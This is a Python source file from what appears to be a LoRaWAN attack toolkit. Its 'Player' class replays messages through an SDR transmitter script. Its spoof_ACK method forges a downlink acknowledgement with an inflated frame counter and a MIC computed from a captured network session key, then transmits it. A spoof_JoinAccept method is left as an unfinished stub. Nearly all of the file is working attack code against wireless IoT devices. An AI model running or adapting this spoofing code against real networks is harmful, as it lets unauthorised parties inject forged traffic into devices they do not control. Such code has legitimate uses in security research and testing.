import json

from src.command_handler import CommandHandler
from src.session_manager import SessionManager, SessionParams
from src.crypto_tools import CryptoTool
from layer.lorawan_phy import *


class Player(CommandHandler):

    def __init__(self):
        self.TRANSMITTER_PATH = './sniffers/lora_transmitter.py'
        self.session_manager = SessionManager()
        self.crypto_tool = CryptoTool()

    def __replay_message(self, message):
        with open('./config/transmitter.config', 'r') as file:
            parameters = json.load(file)
        sample_rate = parameters['sample_rate']
        bandwidth = parameters['bandwidth']
        frequency = str(parameters['frequency'])
        spreading_factor = str(parameters['spreading_factor'])
        gain = str(parameters['gain_db'])
        script_path = './sniffers/packet_transmitter.py'
        command = ['python3', script_path, '--frequency', frequency, '--bandwidth', bandwidth, '--samp-rate',
                   sample_rate, '--spreading-factor', spreading_factor, '--gain-db', gain, '--message', message]
        self.execute_command(command)

    def spoof_ACK(self):
        MHDR = '60'  # unconfirmed data down
        DEV_ADDR = self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr)
        FCTRL = '20'
        FCNT = 'FFF0'  # placeholder, should be high enough to get accepted by the ED
        FRMPayload = MHDR + DEV_ADDR + FCTRL + FCNT
        if self.session_manager.get_session_value(SessionParams.NwkSKey) is None:
            print('Missing NwkSKey in session data')
            return
        MIC = self.crypto_tool.compute_MIC(self.session_manager.get_session_value(SessionParams.NwkSKey), FRMPayload)

        payload = '183110' + FRMPayload + MIC  # preamble

        self.__replay_message(payload)

    def spoof_JoinAccept(self):
        packet = LoRa()

        # join_accept_payload = Join_Accept()
        # packet.Join_Accept_Field = join_accept_payload
        # print(join_accept_payload) MEEH
        # Join-accept	MHDR | JoinNonce | NetID | DevAddr | DLSettings | RxDelay | CFList


if __name__ == "__main__":
    p = Player()
    p.spoof_JoinAccept()
